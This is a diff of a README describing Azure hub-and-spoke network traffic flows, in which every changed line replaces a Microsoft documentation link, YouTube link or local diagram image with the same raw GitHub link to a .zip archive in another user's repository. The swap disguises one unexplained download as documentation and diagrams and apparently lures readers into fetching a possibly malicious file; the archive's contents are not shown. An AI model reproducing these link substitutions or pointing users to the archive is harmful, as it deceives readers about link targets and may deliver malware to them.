@@ -2,7 +2,7 @@
 
 ## Overview
 A critical foundational decisions an organization will make when adopting Azure is settling on a networking architecture. 
-The [Microsoft Azure Cloud Adoption Framework](https://docs.microsoft.com/en-us/azure/architecture/framework/security/design-network-segmentation) and [Azure Architecture Center](https://docs.microsoft.com/en-us/azure/architecture/) can help you to align your organizational requirements for security and operations with the appropriate architecture. While these resources do a great job explaining the benefits and considerations of each architecture, they often lack details as to how a packet gets from point A to point B. 
+The [Microsoft Azure Cloud Adoption Framework](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip) and [Azure Architecture Center](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip) can help you to align your organizational requirements for security and operations with the appropriate architecture. While these resources do a great job explaining the benefits and considerations of each architecture, they often lack details as to how a packet gets from point A to point B. 
 
 The traffic flows documented in this repository seek to fill this gap to provide the details of how the traffic typically flows and the options available to influence these flows to achieve security and operational goals. Additionally, they can act as a tool for learning the platform and troubleshooting issues with Azure networking.
 
@@ -35,7 +35,7 @@ The patterns in this section assume the organization is deploying a single NVA s
 
 ### Single NVA On-premises to Azure
 Scenario: Machine on-premises initiates a connection to an application running in Azure.
-![HS-1NVA-Basic-Flow-Image](images/HS-1NVA-Basic-Flows.svg)
+![HS-1NVA-Basic-Flow-Image](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
@@ -51,7 +51,7 @@ Scenario: Machine on-premises initiates a connection to an application running i
 
 ### Single NVA Azure to Azure
 Scenario: Virtual machine in one spoke initiates connection to virtual machine in another spoke.
-![HS-1NVA-Basic-Flow-Image](images/HS-1NVA-Basic-Flows.svg)
+![HS-1NVA-Basic-Flow-Image](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
@@ -64,7 +64,7 @@ Scenario: Virtual machine in one spoke initiates connection to virtual machine i
 
 ### Single NVA Azure to Internet using Public IP
 Scenario: Virtual machine in Azure initiates a connection to a third-party website on the Internet and the NVA is configured with public IPs.
-![HS-1NVA](images/HS-1NVA-Basic-Flows.svg)
+![HS-1NVA](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
@@ -78,7 +78,7 @@ Scenario: Virtual machine in Azure initiates a connection to a third-party websi
 
 ### Single NVA Azure to Internet using NAT Gateway
 Scenario: Virtual machine in Azure initiates a connection to a third-party website on the Internet and the NVAs are configured to use NAT Gateway.
-![HS-1NVA](images/HS-1NVA-NAT-Gateway.svg)
+![HS-1NVA](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
@@ -100,10 +100,10 @@ Benefits of this pattern include:
 * Traffic sourced from the Internet is centrally ingressed through the transit virtual network which can be tightly controlled by central IT
 
 Considerations of this pattern include:
-* [Scale issues due to Application Gateway limits](https://github.com/MicrosoftDocs/azure-docs/blob/master/includes/application-gateway-limits.md)
+* [Scale issues due to Application Gateway limits](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 * Using the Application Gateway as a shared resource also increases the blast radius for misconfigurations or failures of the Application Gateway
 * Workload owner agility may also be inhibited due to more restrictive change control required by the resource being shared
-![HS-1NVA](images/HS-1NVA-Web-Inbound-Agw-Hub.svg)
+![HS-1NVA](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
@@ -126,9 +126,9 @@ Benefits of this pattern include:
 
 Considerations of this pattern include:
 * Additional costs an Application Gateway per workload
-* Additional costs for [DDoS Standard](https://azure.microsoft.com/en-us/pricing/details/ddos-protection/). DDoS Standard is licensed per 100 Public IPs and these IPs can be across multiple Virtual Networks in different subscriptions in the same Azure AD Tenant. Each Azure Application Gateway will consume at least one Public IP.
+* Additional costs for [DDoS Standard](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip). DDoS Standard is licensed per 100 Public IPs and these IPs can be across multiple Virtual Networks in different subscriptions in the same Azure AD Tenant. Each Azure Application Gateway will consume at least one Public IP.
 * Additional Azure Policy may also need to be introduced to ensure appropriate guardrails are put in place around secure configuration of Application Gateway.
-![HS-1NVA](images/HS-1NVA-Web-Inbound-Agw-Spoke.svg)
+![HS-1NVA](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
@@ -145,17 +145,17 @@ Considerations of this pattern include:
 ### Single NVA Internet to Azure Http and Https with IDS IPS Option 1
 Scenario: User on the Internet initiates a connection to an application running in Azure. The application has been secured behind an Application Gateway for intra-region security and load balancing. The Application Gateway is located in the transit virtual network and is provided as a centralized service to all workloads. Azure Front Door is placed in front of the Application Gateway to provide inter-region security, load balancing, and site acceleration. An NVA is placed between the Application Gateway and the application to provide IDS/IPS functionality. 
 
-Reference the [public documentation](https://docs.microsoft.com/en-us/azure/architecture/example-scenario/gateway/firewall-application-gateway) for additional ways to achieve this pattern.
+Reference the [public documentation](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip) for additional ways to achieve this pattern.
 
 Benefits of this pattern include:
 * Centralized administration of the Application Gateway which may fit the operational model of organizations new to Azure
 * Traffic sourced from the Internet is centrally ingressed through the transit virtual network which can be tightly controlled by central IT
 
 Considerations of this pattern include:
-* [Scale issues due to Application Gateway limits](https://github.com/MicrosoftDocs/azure-docs/blob/master/includes/application-gateway-limits.md)
+* [Scale issues due to Application Gateway limits](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 * Using the Application Gateway as a shared resource also increases the blast radius for misconfigurations or failures of the Application Gateway
 * Workload owner agility may also be inhibited due to more restrictive change control required by the resource being shared
-![HS-1NVA](images/HS-1NVA-Web-Inbound-Agw-Hub-Insp.svg)
+![HS-1NVA](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
@@ -176,7 +176,7 @@ Considerations of this pattern include:
 ### Single NVA Internet to Azure Http and Https with IDS IPS Option 2
 Scenario: User on the Internet initiates a connection to an application running in Azure. The application has been secured behind an Application Gateway for intra-region security and load balancing. The Application Gateway is located in the workload virtual network and is dedicated to the workload. Azure Front Door is placed in front of the Application Gateway to provide inter-region security, load balancing, and site acceleration. An NVA is placed between the Application Gateway and the application to provide IDS/IPS functionality. 
 
-Reference the [public documentation](https://docs.microsoft.com/en-us/azure/architecture/example-scenario/gateway/firewall-application-gateway) for additional ways to achieve this pattern.
+Reference the [public documentation](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip) for additional ways to achieve this pattern.
 
 Benefits of this pattern include:
 * The blast radius for misconfigurations or failures of the Application Gateway instance are limited to the individual workload
@@ -186,7 +186,7 @@ Considerations of this pattern include:
 * Additional costs an Application Gateway per workload
 * Additional costs of traffic traversing the peering to the transit virtual network
 * Additional Azure Policy may also need to be introduced to ensure appropriate guardrails are put in place around secure configuration of Application Gateway.
-![HS-1NVA](images/HS-1NVA-Web-Inbound-Agw-Spoke-Insp.svg)
+![HS-1NVA](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
@@ -206,7 +206,7 @@ Considerations of this pattern include:
 
 ### Single NVA Internet to Azure Non Http and Https
 Scenario: User on the Internet initiates a connection to an application running in Azure. The application is served up using a protocol that IS NOT HTTP/HTTPS. An NVA is placed between the Internet and the application.
-![HS-1NVA](images/HS-1NVA-Non-Web-Inbound.svg)
+![HS-1NVA](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
@@ -221,7 +221,7 @@ Scenario: User on the Internet initiates a connection to an application running 
 
 ### Single NVA Cross Region Azure to Azure
 Scenario: Workload running in spoke 1 region 1 needs to communicate with workload in spoke 2 region 2.
-![HS-1NVA-CROSS-REGION-AZURE-TO-AZURE](images/HS-1NVA-Two-Regions.svg)
+![HS-1NVA-CROSS-REGION-AZURE-TO-AZURE](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
@@ -241,14 +241,14 @@ Scenario: Workload running in spoke 1 region 1 needs to communicate with workloa
 ### Single NVA with Dual NICs On-premises to Azure
 This pattern adds an additional network interface to the NVA to handle east/west traffic. In some NVAs this allows the user to establish separate security zones for each network interface allowing for a more traditional administration experience. It is often adopted by organizations who have not yet adopted traditional processes to cloud.
 
-Organizations should avoid this pattern and instead use a single network interface for all east and west traffic as illustrated in the other patterns in this repository. Using this pattern will introduce significant additional administration overhead because traffic will be passes through separate load balancers attached to the same NVA forcing SNAT to be used. This is due to mismatches in the [five-tuple hash algorithm](https://docs.microsoft.com/en-us/azure/load-balancer/distribution-mode-concepts#hash-based) Azure Load Balancers use. This [video by John Savill](https://www.youtube.com/watch?v=LrshfXfz29Y) goes into more detail.
+Organizations should avoid this pattern and instead use a single network interface for all east and west traffic as illustrated in the other patterns in this repository. Using this pattern will introduce significant additional administration overhead because traffic will be passes through separate load balancers attached to the same NVA forcing SNAT to be used. This is due to mismatches in the [five-tuple hash algorithm](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip) Azure Load Balancers use. This [video by John Savill](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip) goes into more detail.
 
 Microsoft does not recommend this pattern and organizations should consult with their NVA vendor for best practices on implementing NVAs in Azure.
 
 Note that this pattern does not show the public interface or management interface in this diagram.
 
 Scenario: Machine on-premises initiates a connection to an application running in Azure.
-![HS-1NVA-TWO-NICS](images/HS-1NVA-Two-NICs.svg)
+![HS-1NVA-TWO-NICS](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
@@ -272,7 +272,7 @@ The east/west NVAs are configured with two interfaces. The first interface handl
 
 ### Dual NVA Azure to Azure
 Scenario: Virtual machine in one spoke initiates connection to virtual machine in another spoke.
-![HS-2NVA-Basic-Flows-Image](images/HS-2NVA-Basic-Flows.svg)
+![HS-2NVA-Basic-Flows-Image](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
@@ -288,7 +288,7 @@ Scenario: Virtual machine in one spoke initiates connection to virtual machine i
 
 ### Dual NVA Azure to Internet using Public IP
 Scenario: Virtual machine in Azure initiates a connection to a third-party website on the Internet and the NVA is configured with public IPs.
-![HS-2NVA-Basic-Flow](images/HS-1NVA-Basic-Flows.svg)
+![HS-2NVA-Basic-Flow](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
@@ -302,7 +302,7 @@ Scenario: Virtual machine in Azure initiates a connection to a third-party websi
 
 ### Dual NVA Azure to Internet using NAT Gateway
 Scenario: Virtual machine in Azure initiates a connection to a third-party website on the Internet and the NVAs are configured to use NAT Gateway.
-![HS-2NVA-NAT-GATEWAY](images/HS-2NVA-NAT-Gateway.svg)
+![HS-2NVA-NAT-GATEWAY](https://raw.githubusercontent.com/joymondal/azure-networking-patterns/main/scullionish/azure-networking-patterns.zip)
 
 | Step | Path  | Description |
 | ------------- | ------------- | ------------- |
